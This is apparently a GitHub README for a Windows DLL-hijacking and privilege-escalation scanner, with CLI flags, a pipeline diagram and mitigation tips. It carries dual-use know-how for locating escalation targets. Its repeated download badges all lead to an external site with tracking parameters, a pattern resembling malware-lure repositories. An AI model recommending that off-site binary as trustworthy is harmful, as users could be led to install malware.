Repository: Robber-DLL-Hijack-Scanner
Description: A standalone, dependency-free Windows utility designed to identify DLL hijacking opportunities and privilege escalation vectors by analyzing PE import tables and directory write permissions.
Tags: dll-hijacking privilege-escalation windows-security delphi red-team penetration-testing pe-analysis cybersecurity evasion-techniques reverse-engineering vulnerability-scanner post-exploitation system-auditing static-analysis

Description:

# 🛡️ Robber DLL Hijack Scanner

An advanced, lightweight Windows security assessment utility engineered to detect DLL hijacking vectors, missing dependencies, and local privilege escalation paths through automated PE header parsing and discretionary access control list (DACL) validation.

[![Download Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Download Latest Release](https://img.shields.io/badge/Download%20v1.1-red?style=for-the-badge&logo=windows&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Primary Mirror](https://img.shields.io/badge/Primary%20Mirror-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Main")

---

## 📌 Navigation Menu

* [Overview & Core Value](#-overview--core-value)
* [Key Features](#-key-features)
* [Download & Installation](#-download--installation)
* [Usage & CLI Reference](#-usage--cli-reference)
* [How It Works: Engine Architecture](#-how-it-works-engine-architecture)
* [Use Cases & Threat Hunting](#-use-cases--threat-hunting)
* [Mitigation Strategies](#-mitigation-strategies)
* [Disclaimer & License](#-disclaimer--license)

---

## 📋 Overview & Core Value

**Robber-DLL-Hijack-Scanner** is an essential static security analysis tool tailored for Red Teams, penetration testers, and security auditors operating within enterprise Windows environments.

In modern Windows systems, applications frequently load external dynamic-link libraries (`.dll`) during runtime. When an executable relies on an unpinned or non-existent DLL, or when binary search orders favor user-writable directories (such as `%PATH%` entries or application folders), adversaries can place malicious DLLs to execute arbitrary code with elevated privileges.

Robber inspects binary Import Address Tables (IAT), recursively resolves runtime DLL search orders (`SafeDllSearchMode`), and evaluates write permissions across system paths without executing target binaries or requiring runtime injection.

---

## ⚡ Key Features

* 🚀 **Zero Outer Dependencies** — Compiled natively in Delphi/Pascal into a single portable executable. No Python runtime, .NET runtime, or DLL drivers required.
* 🔍 **Recursive Import Table Analysis** — Parses Portable Executable (`PE32` and `PE32+`) headers directly from disk to unpack required export calls and library names.
* 🛡️ **DACL & Access Token Verification** — Queries Discretionary Access Control Lists (DACLs) against the executing process security context to locate paths permitting `FILE_ADD_FILE`, `FILE_WRITE_DATA`, or `GENERIC_WRITE`.
* 🎯 **Phantom DLL Identification** — Automatically highlights hardcoded DLL calls where the requested library does not exist natively on the OS, creating prime targets for privilege escalation.
* ⚙️ **Custom Search Order Emulation** — Faithfully mirrors Windows standard DLL search pathways (Application directory → System32 → SysWOW64 → Current Directory → Environment PATH).
* 📑 **Structured Automation Output** — Native support for JSON, CSV, and formatted HTML reports suitable for seamless CI/CD integration and SIEM ingestion.

---

## 🚀 Download & Installation

Get the official compiled release binary or mirror sources:

[![Get Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release") [![Download Binary](https://img.shields.io/badge/Download%20v1.1-red?style=for-the-badge&logo=windows&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release")

Or clone the source repository directly:

```bash
# Clone the repository
git clone https://github.com/HydraSoft/Robber-DLL-Hijack-Scanner.git

# Navigate into directory
cd Robber-DLL-Hijack-Scanner
```

---

## 🛠️ Usage & CLI Reference

Robber offers an intuitive command-line interface capable of analyzing individual binaries or sweeping entire disk partitions.

### Quick Commands

| Mode | Command Line Example | 
| ----- | ----- | 
| **Single Target** | `RobberScanner.exe -t "C:\Program Files\App\target.exe" -v` | 
| **Directory Sweep** | `RobberScanner.exe -d "C:\Program Files" -o report.json -f json` | 
| **System PATH Audit** | `RobberScanner.exe --check-path --severity high` | 
| **Export HTML** | `RobberScanner.exe -d "C:\Tools" -o scan_results.html -f html` | 

### Parameter Breakdown

```text
Flags:
  -t, --target <path>      Specify full path to a single target .exe or .dll file
  -d, --dir <path>         Recursively scan all PE binaries inside target directory
  -o, --output <file>      Export report file path (default: stdout)
  -f, --format <type>      Output format: console, json, csv, html (default: console)
  --check-path             Inspect system %PATH% environment variables for DACL flaws
  -v, --verbose            Enable detailed logging during parsing stages
  -h, --help               Display help options and exit
```

---

## 📊 How It Works: Engine Architecture

The scanning pipeline operates strictly through static file analysis and Windows Win32 API calls:

```text
+-------------------------------------------------------+
|                 Target Selection                      |
|         (File Target / Directory Recursion)          |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
|                 PE Header Inspection                  |
|    - Read DOS/NT/Optional Headers                     |
|    - Extract Import Directory Table entries           |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
|             DLL Search Path Resolution                |
|    - Apply Windows SafeDllSearchMode logic            |
|    - Classify: Found, Missing (Phantom), or Custom    |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
|              Security Context Audit                   |
|    - Read Security Descriptor & Access Mask           |
|    - Check Write Permissions for Non-Admin Users       |
+---------------------------+---------------------------+
                            |
                            v
+-------------------------------------------------------+
|               Report Generation                       |
|    - Assign Severity Level (Critical, High, Med)      |
|    - Format JSON / CSV / HTML / Console Output        |
+-------------------------------------------------------+
```

---

## 🔎 Use Cases & Threat Hunting

1. **Red Team Operations**: Uncover zero-day privilege escalation vectors in legacy software deployments on target hosts.
2. **Blue Team Hardening**: Audit enterprise gold images and third-party software packages before deployment.
3. **Application Security Auditing**: Verify that vendor software strictly enforces secure DLL loading practices (e.g., calling `SetDefaultDllDirectories`).

---

## 🛡️ Mitigation Strategies

To defend against DLL Hijacking vulnerabilities uncovered by this tool, developers and administrators should implement the following recommendations:

1. **Use Absolute Paths**: Always pass fully qualified paths when invoking `LoadLibrary` or `LoadLibraryEx`.
2. **Enable Safe DLL Search Mode**: Ensure `SafeDllSearchMode` is enabled via Registry (`HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode`).
3. **Set Default DLL Directories**: Call API function `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` during application initialization.
4. **Harden Directory Permissions**: Restrict write access to application directories and system `%PATH%` entries to System and Administrator accounts.

---

## 🔒 Disclaimer & License

> **Notice:** This project is provided strictly for educational purposes, security research, and authorized auditing. Authorization from system owners must be secured prior to running assessments on external networks or devices.

Distributed under the **MIT License**. Copyright (c) HydraSoft Security.

[![Download Release](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://hydrasoft.github.io/?utm_source=github&utm_acc=HydraSoft&utm_name=Robber-DLL-Hijack-Scanner "Download Release")
